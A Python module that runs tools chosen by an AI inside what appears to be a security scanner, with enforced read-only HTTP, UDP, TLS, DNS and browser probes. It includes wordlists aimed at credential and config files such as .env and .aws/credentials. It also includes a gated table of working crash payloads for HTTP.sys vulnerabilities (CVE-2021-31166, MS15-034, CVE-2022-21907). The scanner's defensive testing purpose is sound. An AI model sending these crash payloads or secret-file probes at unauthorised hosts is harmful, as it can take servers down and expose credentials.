"""ToolRuntime — deterministic execution of AI-selected investigation tools."""
from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from typing import Any, Callable

from src.reasoning.agent import sanitize as san

log = logging.getLogger("netlogic.reasoning.agent.tools")


@dataclass
class ToolResult:
    ok: bool
    observation_id: str
    tool: str
    summary: str
    data: dict = field(default_factory=dict)
    error: str = ""
    network: bool = False  # counts against request budget

    def to_dict(self) -> dict:
        return {
            "ok": self.ok, "observation_id": self.observation_id, "tool": self.tool,
            "summary": self.summary, "data": self.data, "error": self.error,
            "network": self.network,
        }


# ── Read-only policy ─────────────────────────────────────────────────────────
# Agent tools MUST NOT create, update, or delete application/content data.
# Network I/O is limited to discovery/read probes (GET/HEAD/OPTIONS, UDP query,
# TLS handshake, passive DNS). Session cookies are applied only on the scanner
# side for subsequent reads — we never write resources on the target.

# Built-in path lists for dir_enum (GET only). Small + intentional — not nuclei.
_DIR_LISTS: dict[str, tuple[str, ...]] = {
    "short": (
        "/", "/robots.txt", "/sitemap.xml", "/favicon.ico",
        "/.well-known/security.txt", "/api", "/api/health", "/health",
        "/admin", "/login", "/.env", "/.git/config",
    ),
    "common": (
        "/", "/robots.txt", "/sitemap.xml", "/favicon.ico", "/crossdomain.xml",
        "/.well-known/security.txt", "/.well-known/assetlinks.json",
        "/api", "/api/", "/api/v1", "/api/v1/health", "/api/v1/status", "/api/health",
        "/api/status", "/api/version", "/health", "/healthz", "/ready", "/status",
        "/admin", "/administrator", "/login", "/signin", "/auth", "/oauth",
        "/dashboard", "/console", "/wp-admin", "/wp-login.php", "/graphql",
        "/swagger", "/swagger.json", "/openapi.json", "/docs", "/redoc",
        "/.env", "/.env.local", "/.env.production", "/.git/config", "/.git/HEAD",
        "/.svn/entries", "/backup", "/backup.zip", "/dump.sql", "/phpinfo.php",
        "/server-status", "/server-info", "/actuator", "/actuator/health",
        "/.vercel/project.json", "/_next/static/chunks/main.js",
        "/config.json", "/app.config.json", "/manifest.json",
    ),
    "api": (
        "/api", "/api/v1", "/api/v2", "/api/v1/users", "/api/v1/user", "/api/v1/me",
        "/api/v1/config", "/api/v1/health", "/api/v1/status", "/api/auth/session",
        "/api/auth/csrf", "/api/auth/providers", "/api/auth/signin", "/api/auth/callback",
        "/api/graphql", "/graphql", "/gql", "/rest", "/rest/v1",
        "/v1", "/v1/health", "/internal", "/internal/health", "/debug", "/metrics",
    ),
    "config": (
        "/.env", "/.env.local", "/.env.production", "/.env.development",
        "/.git/config", "/.git/HEAD", "/.svn/entries", "/web.config",
        "/config.php", "/config.json", "/settings.json", "/appsettings.json",
        "/application.properties", "/.aws/credentials", "/wp-config.php",
        "/.htaccess", "/.htpasswd", "/composer.json", "/package.json",
    ),
    "admin": (
        "/admin", "/admin/", "/administrator", "/login", "/signin", "/wp-admin",
        "/wp-login.php", "/user/login", "/accounts/login", "/dashboard",
        "/console", "/manage", "/manager", "/backend", "/cpanel", "/phpmyadmin",
        "/adminer", "/nexus", "/jenkins", "/grafana",
    ),
}

_SSDP_MSEARCH = (
    "M-SEARCH * HTTP/1.1\r\n"
    "HOST: 239.255.255.250:1900\r\n"
    'MAN: "ssdp:discover"\r\n'
    "MX: 2\r\n"
    "ST: ssdp:all\r\n"
    "\r\n"
).encode("ascii")

# Curated crash/DoS-class probes — never freeform AI-invented kernel crashes.
# Only available when allow_crash_probes=True. Still non-write, but may disrupt host.
_CRASH_PROBES: dict[str, dict] = {
    "cve-2021-31166": {
        "description": "HTTP.sys UAF via crafted Accept-Encoding (may BSOD unpatched hosts)",
        "method": "GET",
        "path": "/",
        "headers": {
            # Public research pattern; destructive on vulnerable http.sys
            "Accept-Encoding": "doar-e, f, asdf, gzip, deflate",
        },
        "signals": ("timeout", "reset", "connection aborted", "forcibly closed"),
    },
    "cve-2022-21907": {
        "description": "HTTP Protocol Stack RCE/DoS via crafted URL trail (may crash unpatched)",
        "method": "GET",
        "path": "/{trailing}",  # expanded to path with trailing data
        "headers": {},
        "signals": ("timeout", "reset", "connection aborted", "forcibly closed"),
        "path_override": "/" + ("A" * 100) + "/",
    },
    "cve-2015-1635": {
        "description": "MS15-034 HTTP.sys Range header (may BSOD unpatched IIS ≤8.5)",
        "method": "GET",
        "path": "/",
        "headers": {"Range": "bytes=0-18446744073709551615"},
        "signals": ("timeout", "reset", "requested range not satisfiable", "416"),
    },
}


class ToolRuntime:
    """Validates and executes tool calls. AI proposes; this class alone touches the network."""

    def __init__(
        self,
        *,
        host: str,
        port: int = 80,
        tls: bool = False,
        scope: list[str] | None = None,
        allow_crash_probes: bool = False,
        http_fn: Callable | None = None,
        obs_counter_start: int = 0,
    ) -> None:
        self.host = host
        self.port = port
        self.tls = tls
        self.scope = list(scope or [host])
        self.allow_crash_probes = allow_crash_probes
        self._http_fn = http_fn  # injectable (tests)
        self._n = obs_counter_start
        self.findings: list[dict] = []
        self.chains: list[dict] = []
        self.observations: list[dict] = []
        # Scanner-side session only (Cookie / Authorization on outbound reads).
        self._session_cookies: dict[str, str] = {}
        self._session_headers: dict[str, str] = {}

    def _oid(self) -> str:
        self._n += 1
        return f"obs_{self._n}"

    def catalog(self) -> list[dict]:
        tools = [
            {"name": "http_request", "risk": "safe_active",
             "args": "method(GET|HEAD|OPTIONS),path,headers?,port?,tls?,timeout? — READ-ONLY"},
            {"name": "raw_tcp", "risk": "safe_active", "args": "payload (str|bytes),port?,timeout?"},
            {"name": "udp_probe", "risk": "safe_active",
             "args": "port,payload? (str|bytes),timeout? — READ-ONLY UDP query"},
            {"name": "ssdp_discover", "risk": "safe_active",
             "args": "port? (default 1900),timeout? — M-SEARCH discovery only"},
            {"name": "tls_inspect", "risk": "read_only", "args": "port?"},
            {"name": "dns_lookup", "risk": "read_only", "args": "(none — uses target host)"},
            {"name": "confirm_tech", "risk": "safe_active", "args": "tech (iis|nginx|express|…)"},
            {"name": "timing_probe", "risk": "safe_active",
             "args": "path_a,path_b?,headers_a?,headers_b? — GET timing only"},
            {"name": "dir_enum", "risk": "safe_active",
             "args": "wordlist(common|api|config|admin|short)?,max_paths?,port?,tls? — GET only"},
            {"name": "set_session", "risk": "none",
             "args": "cookies?{},headers?{} — scanner-side auth for subsequent READs only"},
            {"name": "clear_session", "risk": "none", "args": "(none)"},
            {"name": "browser_get", "risk": "safe_active",
             "args": "path?,port?,tls?,timeout?,wait_ms? — headless GET; may pass JS challenges; READ-ONLY"},
            {"name": "assert_finding", "risk": "none",
             "args": "id,title,severity,status(confirmed|lead),evidence_refs[],rationale?"},
            {"name": "chain_link", "risk": "none", "args": "from,to,why"},
            {"name": "stop", "risk": "none", "args": "summary?"},
        ]
        if self.allow_crash_probes:
            tools.append({
                "name": "crash_probe", "risk": "intrusive",
                "args": f"cve_id one of {sorted(_CRASH_PROBES)} — MAY crash target (still non-write)",
            })
        return tools

    def execute(self, tool: str, args: dict | None) -> ToolResult:
        args = args if isinstance(args, dict) else {}
        name = str(tool or "").strip().lower()
        try:
            if name == "http_request":
                return self._http_request(args)
            if name == "raw_tcp":
                return self._raw_tcp(args)
            if name == "udp_probe":
                return self._udp_probe(args)
            if name == "ssdp_discover":
                return self._ssdp_discover(args)
            if name == "tls_inspect":
                return self._tls_inspect(args)
            if name == "dns_lookup":
                return self._dns_lookup(args)
            if name == "confirm_tech":
                return self._confirm_tech(args)
            if name == "timing_probe":
                return self._timing_probe(args)
            if name == "dir_enum":
                return self._dir_enum(args)
            if name == "set_session":
                return self._set_session(args)
            if name == "clear_session":
                return self._clear_session(args)
            if name == "browser_get":
                return self._browser_get(args)
            if name == "assert_finding":
                return self._assert_finding(args)
            if name == "chain_link":
                return self._chain_link(args)
            if name == "stop":
                oid = self._oid()
                return ToolResult(True, oid, "stop", str(args.get("summary") or "stop"),
                                  data={"stop": True}, network=False)
            if name == "crash_probe":
                return self._crash_probe(args)
            oid = self._oid()
            return ToolResult(False, oid, name, "unknown tool", error="unknown tool")
        except Exception as exc:  # noqa: BLE001
            oid = self._oid()
            log.debug("tool %s failed: %s", name, exc)
            return ToolResult(False, oid, name, f"error: {exc}", error=str(exc)[:200])

    # ── Network helpers ──────────────────────────────────────────────────────

    def _merge_headers(self, headers: dict | None) -> dict[str, str]:
        """Outbound headers = session + per-call (session cannot be overridden by empty)."""
        out: dict[str, str] = dict(self._session_headers)
        if headers:
            out.update(headers)
        if self._session_cookies:
            cookie = "; ".join(f"{k}={v}" for k, v in self._session_cookies.items())
            # Append to any explicit Cookie
            existing = out.get("Cookie") or out.get("cookie") or ""
            out["Cookie"] = f"{existing}; {cookie}".strip("; ") if existing else cookie
        return out

    def _do_http(self, method: str, path: str, headers: dict, body: str | None,
                 port: int, tls: bool, timeout: float) -> dict:
        # Enforce read-only methods even if a caller bypasses sanitize
        method = (method or "GET").upper()
        if method not in ("GET", "HEAD", "OPTIONS"):
            return {"error": "method not allowed (read-only)", "elapsed_ms": 0,
                    "status": None, "headers": {}, "body": ""}
        headers = self._merge_headers(headers or {})
        # Never send a body on mutating-capable verbs — and we only allow safe verbs.
        body = None
        if self._http_fn is not None:
            return self._http_fn(method, path, headers, body, port, tls, timeout)
        from src.verifier.runner import (  # noqa: PLC0415
            _build_http_request, _parse_http_response, _tcp_send_recv,
        )
        payload = _build_http_request(method, path, self.host, headers, body)
        raw, elapsed, err = _tcp_send_recv(self.host, port, payload, timeout=timeout, use_tls=tls)
        if err:
            return {"error": err, "elapsed_ms": elapsed, "status": None, "headers": {}, "body": ""}
        if raw is None:
            return {"error": "no response", "elapsed_ms": elapsed, "status": None,
                    "headers": {}, "body": ""}
        status, resp_headers, resp_body = _parse_http_response(raw)
        return {
            "error": "", "elapsed_ms": elapsed, "status": status,
            "headers": dict(resp_headers), "body": (resp_body or "")[:2000],
        }

    def _http_request(self, args: dict) -> ToolResult:
        oid = self._oid()
        method = san.safe_method(args.get("method") or "GET") or "GET"
        path = san.safe_path(args.get("path") or "/")
        headers = san.safe_headers(args.get("headers"))
        if path is None or headers is None:
            return ToolResult(False, oid, "http_request", "invalid path/headers",
                              error="sanitize failed", network=False)
        # body intentionally ignored — read-only probes
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        timeout = san.safe_timeout(args.get("timeout"), 5.0)
        resp = self._do_http(method, path, headers, None, port, tls, timeout)
        if resp.get("error"):
            tr = ToolResult(False, oid, "http_request",
                            f"{method} {path} → {resp['error']}",
                            data=resp, error=str(resp["error"]), network=True)
        else:
            tr = ToolResult(True, oid, "http_request",
                            f"{method} {path} → HTTP {resp.get('status')}",
                            data=resp, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _raw_tcp(self, args: dict) -> ToolResult:
        oid = self._oid()
        raw = san.safe_raw_payload(args.get("payload") or args.get("data"))
        if raw is None:
            return ToolResult(False, oid, "raw_tcp", "invalid payload", error="sanitize failed")
        port = san.safe_port(args.get("port"), self.port)
        timeout = san.safe_timeout(args.get("timeout"), 5.0)
        from src.verifier.runner import _tcp_send_recv  # noqa: PLC0415
        resp, elapsed, err = _tcp_send_recv(self.host, port, raw, timeout=timeout, use_tls=False)
        data = {"elapsed_ms": elapsed, "error": err,
                "response": (resp.decode("utf-8", "replace")[:1500] if resp else "")}
        ok = not err and resp is not None
        nbytes = len(resp) if resp else 0
        tr = ToolResult(ok, oid, "raw_tcp",
                        f"tcp :{port} → {err or f'{nbytes} bytes'}",
                        data=data, error=err, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _udp_probe(self, args: dict) -> ToolResult:
        """Read-only UDP send/recv (discovery/query only — no application writes)."""
        oid = self._oid()
        port = san.safe_port(args.get("port"), 1900)
        timeout = san.safe_timeout(args.get("timeout"), 3.0)
        raw = san.safe_raw_payload(args.get("payload") or args.get("data"))
        if raw is None:
            # Default: empty probe / newline — still a query, not a write protocol
            raw = b"\r\n"
        import socket  # noqa: PLC0415
        t0 = time.time()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            try:
                sock.sendto(raw, (self.host, port))
                data, addr = sock.recvfrom(4096)
                elapsed = (time.time() - t0) * 1000
                text = data.decode("utf-8", "replace")[:2000]
                tr = ToolResult(
                    True, oid, "udp_probe",
                    f"udp :{port} → {len(data)} bytes from {addr[0]}",
                    data={"elapsed_ms": elapsed, "from": f"{addr[0]}:{addr[1]}",
                          "response": text, "port": port},
                    network=True,
                )
            finally:
                sock.close()
        except socket.timeout:
            elapsed = (time.time() - t0) * 1000
            tr = ToolResult(False, oid, "udp_probe", f"udp :{port} → timeout",
                            data={"elapsed_ms": elapsed, "port": port},
                            error="timeout", network=True)
        except Exception as exc:  # noqa: BLE001
            tr = ToolResult(False, oid, "udp_probe", f"udp :{port} → {exc}",
                            error=str(exc)[:200], network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _ssdp_discover(self, args: dict) -> ToolResult:
        """SSDP M-SEARCH only — device discovery, no configuration changes."""
        oid = self._oid()
        port = san.safe_port(args.get("port"), 1900)
        timeout = san.safe_timeout(args.get("timeout"), 3.0)
        import socket  # noqa: PLC0415
        t0 = time.time()
        replies: list[str] = []
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            try:
                # Unicast M-SEARCH to the target (scan of one host, not LAN flood)
                sock.sendto(_SSDP_MSEARCH, (self.host, port))
                deadline = time.time() + timeout
                while time.time() < deadline:
                    try:
                        sock.settimeout(max(0.1, deadline - time.time()))
                        data, addr = sock.recvfrom(4096)
                        replies.append(
                            f"from {addr[0]}:{addr[1]}\n{data.decode('utf-8', 'replace')[:800]}"
                        )
                        if len(replies) >= 5:
                            break
                    except socket.timeout:
                        break
            finally:
                sock.close()
            elapsed = (time.time() - t0) * 1000
            ok = bool(replies)
            tr = ToolResult(
                ok, oid, "ssdp_discover",
                f"ssdp :{port} → {len(replies)} reply(ies)" if ok else f"ssdp :{port} → no reply",
                data={"elapsed_ms": elapsed, "port": port, "replies": replies,
                      "note": "M-SEARCH discovery only (read-only)"},
                error="" if ok else "no reply",
                network=True,
            )
        except Exception as exc:  # noqa: BLE001
            tr = ToolResult(False, oid, "ssdp_discover", str(exc),
                            error=str(exc)[:200], network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _tls_inspect(self, args: dict) -> ToolResult:
        oid = self._oid()
        port = san.safe_port(args.get("port"), 443 if self.tls else self.port)
        try:
            from src.tls_analyzer import probe_protocols  # noqa: PLC0415
            supported, deprecated = probe_protocols(self.host, port)
            data = {"protocols": supported, "deprecated": deprecated}
            ok = bool(supported or deprecated)
            tr = ToolResult(ok, oid, "tls_inspect",
                            f"TLS :{port} supported={','.join(supported or [])}",
                            data=data, network=True)
        except Exception as exc:  # noqa: BLE001
            tr = ToolResult(False, oid, "tls_inspect", str(exc), error=str(exc), network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _dns_lookup(self, args: dict) -> ToolResult:
        oid = self._oid()
        try:
            from src.dns_security import check_spf  # noqa: PLC0415
            spf = check_spf(self.host)
            record = getattr(spf, "record", "") or ""
            data = {"spf": record, "host": self.host}
            tr = ToolResult(True, oid, "dns_lookup",
                            f"SPF: {record[:80]}" if record else "no SPF",
                            data=data, network=True)
        except Exception as exc:  # noqa: BLE001
            tr = ToolResult(False, oid, "dns_lookup", str(exc), error=str(exc), network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _confirm_tech(self, args: dict) -> ToolResult:
        oid = self._oid()
        tech = san.safe_tech_slug(args.get("tech") or args.get("name"))
        if not tech:
            return ToolResult(False, oid, "confirm_tech", "invalid tech", error="sanitize failed")
        from src.reasoning.active_validation import _probe_for_candidate  # noqa: PLC0415
        probe = _probe_for_candidate(tech)
        if probe is None:
            # Fallback: GET / and look for tech name in headers/body
            path, markers = "/", (tech,)
        else:
            path, markers = probe.path, probe.markers
        resp = self._do_http("GET", path, {}, None, self.port, self.tls, 5.0)
        blob = ""
        if not resp.get("error"):
            hdrs = "\n".join(f"{k}: {v}" for k, v in (resp.get("headers") or {}).items())
            blob = f"{hdrs}\n\n{resp.get('body') or ''}".lower()
        hit = next((m for m in markers if m and m.lower() in blob), "")
        ok = bool(hit) and not resp.get("error")
        data = {**resp, "tech": tech, "marker": hit, "path": path}
        tr = ToolResult(ok, oid, "confirm_tech",
                        f"confirm {tech}: {'HIT '+hit if hit else 'no marker'}",
                        data=data, error=str(resp.get("error") or ""), network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _timing_probe(self, args: dict) -> ToolResult:
        oid = self._oid()
        path_a = san.safe_path(args.get("path_a") or args.get("path") or "/")
        path_b = san.safe_path(args.get("path_b") or path_a or "/")
        ha = san.safe_headers(args.get("headers_a")) or {}
        hb = san.safe_headers(args.get("headers_b")) or {}
        if path_a is None or path_b is None:
            return ToolResult(False, oid, "timing_probe", "invalid path", error="sanitize failed")
        ra = self._do_http("GET", path_a, ha, None, self.port, self.tls, 8.0)
        rb = self._do_http("GET", path_b, hb, None, self.port, self.tls, 8.0)
        da = float(ra.get("elapsed_ms") or 0)
        db = float(rb.get("elapsed_ms") or 0)
        delta = abs(da - db)
        data = {"a": ra, "b": rb, "delta_ms": delta}
        tr = ToolResult(True, oid, "timing_probe",
                        f"timing Δ={delta:.0f}ms (a={da:.0f} b={db:.0f})",
                        data=data, network=True)
        self.observations.append(tr.to_dict())
        return tr

    def _dir_enum(self, args: dict) -> ToolResult:
        """GET-only path enumeration from a built-in wordlist. Never writes."""
        oid = self._oid()
        wl = san.safe_wordlist_name(args.get("wordlist") or args.get("list") or "common")
        paths = list(_DIR_LISTS.get(wl) or _DIR_LISTS["common"])
        try:
            max_paths = int(args.get("max_paths") or 40)
        except (TypeError, ValueError):
            max_paths = 40
        max_paths = max(5, min(max_paths, 60))
        paths = paths[:max_paths]
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        timeout = san.safe_timeout(args.get("timeout"), 4.0)

        hits: list[dict] = []
        challenge = 0
        checked = 0
        for path in paths:
            checked += 1
            resp = self._do_http("GET", path, {}, None, port, tls, timeout)
            status = resp.get("status")
            body = (resp.get("body") or "")[:200]
            hdrs = resp.get("headers") or {}
            mitigated = str(hdrs.get("x-vercel-mitigated") or hdrs.get("X-Vercel-Mitigated") or "")
            if "challenge" in mitigated.lower() or "Security Checkpoint" in body:
                challenge += 1
            # Interesting: not vanilla 404 / connection fail
            if resp.get("error"):
                continue
            if status in (200, 201, 204, 301, 302, 307, 308, 401, 403, 500):
                # Skip boring global challenge-only 403s after a few samples
                if status == 403 and challenge >= 3 and "challenge" in mitigated.lower():
                    continue
                hits.append({
                    "path": path, "status": status,
                    "server": hdrs.get("server") or hdrs.get("Server") or "",
                    "location": hdrs.get("location") or hdrs.get("Location") or "",
                    "challenge": bool(mitigated),
                })
            if len(hits) >= 25:
                break

        summary = (
            f"dir_enum[{wl}]: {len(hits)} interesting / {checked} checked"
            + (f" (waf/challenge×{challenge})" if challenge else "")
        )
        tr = ToolResult(
            True, oid, "dir_enum", summary,
            data={"wordlist": wl, "checked": checked, "hits": hits,
                  "challenge_responses": challenge,
                  "note": "GET-only path probe — no writes"},
            network=True,
        )
        self.observations.append(tr.to_dict())
        return tr

    def _set_session(self, args: dict) -> ToolResult:
        """Attach cookies/headers for subsequent READ requests (scanner-side only)."""
        oid = self._oid()
        cookies = san.safe_cookies(args.get("cookies"))
        headers = san.safe_headers(args.get("headers"))
        if cookies is None or headers is None:
            return ToolResult(False, oid, "set_session", "invalid cookies/headers",
                              error="sanitize failed", network=False)
        # Only allow auth-ish headers — not Host / Content-Length
        allowed_h = {}
        for k, v in headers.items():
            kl = k.lower()
            if kl in ("authorization", "cookie", "x-api-key", "x-auth-token",
                      "x-csrf-token", "x-session-id", "x-requested-with"):
                allowed_h[k] = v
        self._session_cookies.update(cookies)
        self._session_headers.update(allowed_h)
        tr = ToolResult(
            True, oid, "set_session",
            f"session set ({len(self._session_cookies)} cookies, "
            f"{len(self._session_headers)} headers)",
            data={"cookies": list(self._session_cookies.keys()),
                  "headers": list(self._session_headers.keys()),
                  "note": "used only on outbound GETs — does not modify target data"},
            network=False,
        )
        return tr

    def _clear_session(self, args: dict) -> ToolResult:
        oid = self._oid()
        self._session_cookies.clear()
        self._session_headers.clear()
        return ToolResult(True, oid, "clear_session", "session cleared",
                          data={}, network=False)

    def _browser_get(self, args: dict) -> ToolResult:
        """Headless browser GET — may pass JS challenges; never submits forms or mutates data."""
        oid = self._oid()
        path = san.safe_path(args.get("path") or "/") or "/"
        port = san.safe_port(args.get("port"), self.port)
        tls = bool(args.get("tls", self.tls))
        timeout = san.safe_timeout(args.get("timeout"), 15.0)
        try:
            wait_ms = int(args.get("wait_ms") or 2500)
        except (TypeError, ValueError):
            wait_ms = 2500
        wait_ms = max(0, min(wait_ms, 10000))

        scheme = "https" if tls or port in (443, 8443) else "http"
        netloc = self.host if port in (80, 443) else f"{self.host}:{port}"
        url = f"{scheme}://{netloc}{path}"

        try:
            from playwright.sync_api import sync_playwright  # noqa: PLC0415
        except ImportError:
            tr = ToolResult(
                False, oid, "browser_get",
                "playwright not installed — cannot solve JS challenges",
                error="playwright missing", network=False,
            )
            self.observations.append(tr.to_dict())
            return tr

        t0 = time.time()
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                try:
                    context = browser.new_context(ignore_https_errors=True)
                    # Seed scanner session into browser
                    if self._session_cookies:
                        context.add_cookies([
                            {"name": k, "value": v, "domain": self.host, "path": "/"}
                            for k, v in self._session_cookies.items()
                        ])
                    page = context.new_page()
                    page.set_extra_http_headers(dict(self._session_headers))
                    page.goto(url, wait_until="domcontentloaded",
                              timeout=int(timeout * 1000))
                    if wait_ms:
                        page.wait_for_timeout(wait_ms)
                    title = page.title() or ""
                    content = page.content() or ""
                    final_url = page.url or url
                    status = None
                    # Best-effort status from performance API is unreliable; detect challenge by body
                    cookies = {c["name"]: c["value"] for c in context.cookies()}
                    # Persist any new cookies for subsequent raw GETs
                    if cookies:
                        self._session_cookies.update(
                            {k: v for k, v in cookies.items() if k and v}
                        )
                    challenge = (
                        "Security Checkpoint" in content
                        or "x-vercel-mitigated" in content.lower()
                        or "cf-browser-verification" in content.lower()
                    )
                    elapsed = (time.time() - t0) * 1000
                    snippet = content[:2500]
                    tr = ToolResult(
                        True, oid, "browser_get",
                        f"browser GET {path} → {final_url[:80]}"
                        + (" [challenge page]" if challenge else f" title={title[:40]!r}"),
                        data={
                            "url": url, "final_url": final_url, "title": title[:200],
                            "elapsed_ms": elapsed, "challenge_page": challenge,
                            "cookies_captured": list(cookies.keys())[:20],
                            "body": snippet,
                            "note": "read-only browser GET — no form submit / no writes",
                        },
                        network=True,
                    )
                finally:
                    browser.close()
        except Exception as exc:  # noqa: BLE001
            tr = ToolResult(
                False, oid, "browser_get", f"browser_get failed: {exc}",
                error=str(exc)[:240], network=True,
            )
        self.observations.append(tr.to_dict())
        return tr

    def _assert_finding(self, args: dict) -> ToolResult:
        oid = self._oid()
        fid = san.safe_id(args.get("id") or f"finding_{len(self.findings)+1}")
        title = str(args.get("title") or "")[:200]
        severity = str(args.get("severity") or "medium").lower()[:16]
        status = str(args.get("status") or "lead").lower()
        if status not in ("confirmed", "lead"):
            status = "lead"
        refs = args.get("evidence_refs") or []
        if not isinstance(refs, list):
            refs = []
        refs = [str(r)[:64] for r in refs[:12]]
        # Confirmed findings need at least one observation ref that exists
        if status == "confirmed":
            known = {o.get("observation_id") for o in self.observations}
            if not refs or not any(r in known for r in refs):
                status = "lead"  # cannot confirm without tool evidence
        finding = {
            "id": fid, "title": title, "severity": severity, "status": status,
            "evidence_refs": refs, "rationale": str(args.get("rationale") or "")[:300],
        }
        # Upsert by id
        self.findings = [f for f in self.findings if f.get("id") != fid] + [finding]
        tr = ToolResult(True, oid, "assert_finding",
                        f"{status}: {title or fid}", data=finding, network=False)
        return tr

    def _chain_link(self, args: dict) -> ToolResult:
        oid = self._oid()
        fr = san.safe_id(args.get("from") or args.get("src"), 120)
        to = san.safe_id(args.get("to") or args.get("dst"), 120)
        why = str(args.get("why") or args.get("rationale") or "")[:300]
        if not fr or not to:
            return ToolResult(False, oid, "chain_link", "from/to required", error="missing ends")
        link = {"from": fr, "to": to, "why": why}
        self.chains.append(link)
        tr = ToolResult(True, oid, "chain_link", f"{fr} → {to}", data=link, network=False)
        return tr

    def _crash_probe(self, args: dict) -> ToolResult:
        oid = self._oid()
        if not self.allow_crash_probes:
            return ToolResult(
                False, oid, "crash_probe",
                "crash probes disabled — set allow_crash_probes to enable",
                error="not authorized", network=False,
            )
        cve = str(args.get("cve_id") or args.get("cve") or "").strip().lower()
        spec = _CRASH_PROBES.get(cve)
        if spec is None:
            return ToolResult(
                False, oid, "crash_probe",
                f"unknown curated probe (allowed: {sorted(_CRASH_PROBES)})",
                error="unknown cve", network=False,
            )
        path = spec.get("path_override") or san.safe_path(spec.get("path") or "/") or "/"
        headers = dict(spec.get("headers") or {})
        method = spec.get("method") or "GET"
        # Baseline request first (control)
        control = self._do_http("GET", "/", {}, None, self.port, self.tls, 5.0)
        t0 = time.time()
        resp = self._do_http(method, path, headers, None, self.port, self.tls, 8.0)
        elapsed = (time.time() - t0) * 1000
        err = str(resp.get("error") or "").lower()
        signals = spec.get("signals") or ()
        signal_hit = any(s in err for s in signals) if err else False
        # Timeout / reset after a previously healthy control is a strong vuln signal
        control_ok = not control.get("error")
        vulnerable_signal = bool(signal_hit or (control_ok and err in (
            "timeout", "connection reset", "connection aborted",
        )) or (control_ok and err and "forcibly closed" in err))
        # 416 on Range probe is classic MS15-034 positive on some stacks
        if cve == "cve-2015-1635" and resp.get("status") == 416:
            vulnerable_signal = True
        data = {
            "cve_id": cve, "description": spec.get("description"),
            "control": control, "probe": resp, "elapsed_ms": elapsed,
            "vulnerable_signal": vulnerable_signal,
            "warning": "destructive probe — interpret timeouts carefully (WAF/network vs crash)",
        }
        summary = (
            f"crash_probe {cve}: VULNERABLE SIGNAL" if vulnerable_signal
            else f"crash_probe {cve}: no crash signal ({err or resp.get('status')})"
        )
        tr = ToolResult(True, oid, "crash_probe", summary, data=data, network=True)
        self.observations.append(tr.to_dict())
        # Auto-record finding when signal fires
        if vulnerable_signal:
            self.findings.append({
                "id": cve, "title": f"{cve} remote crash/DoS signal",
                "severity": "critical", "status": "confirmed",
                "evidence_refs": [oid],
                "rationale": spec.get("description", ""),
            })
        return tr
